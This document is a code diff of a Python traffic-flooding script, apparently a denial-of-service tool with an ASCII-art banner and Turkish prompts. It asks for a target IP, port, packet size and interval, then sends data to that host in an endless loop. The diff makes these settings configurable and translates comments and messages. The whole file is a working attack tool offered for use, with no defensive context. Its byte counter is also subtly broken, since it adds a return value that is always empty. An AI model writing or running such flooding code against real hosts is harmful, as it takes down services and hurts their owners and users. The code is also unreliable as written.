@@ -1,5 +1,6 @@
 import socket
 import time
+
 print('''
                                                                                                                              
                                    #                         ######   ######                  
@@ -10,16 +11,16 @@ print('''
    #    #    #  #    #  #   #   #     #  #    #  #    #      #     #  #     #  #    #  #    # 
    #     ####    ####   #    #  #     #   ####    ####       ######   ######    ####    ####   
                                                                             
-                                                                            
-
+                                                                             
 ''')
+
 # Kullanıcıdan IP adresini alın
 ip = input("Hedef IP adresini girin: ")
 
-# Define port number, message size in bytes, and sending interval (in seconds)
-port = 80
-msg_size = 64 * 1024    # Set message size as 64 KB
-interval = 1            # Send one packet per second
+# Kullanıcıdan port numarasını, mesaj boyutunu (byte cinsinden) ve gönderim aralığını (saniye cinsinden) alın
+port = int(input("Port numarasını girin: "))
+msg_size = int(input("Mesaj boyutunu (KB cinsinden) girin: ")) * 1024
+interval = float(input("Gönderim aralığını (saniye cinsinden) girin: "))
 
 total_sent = 0   # Toplam gönderilen veri miktarını takip etmek için değişken tanımlayın
 
@@ -34,7 +35,7 @@ while True:
                 sent = s.sendall(data)      # Send packets continuously until the specified interval has elapsed
                 total_sent += sent          # Gönderilen veri miktarını toplam gönderilen veriyle güncelle
         except Exception as e:
-            print("Error:", str(e))
+            print("Hata:", str(e))
     
     # Gönderilen veri miktarını ekrana yazdır
     print("Toplam gönderilen veri miktarı:", total_sent)
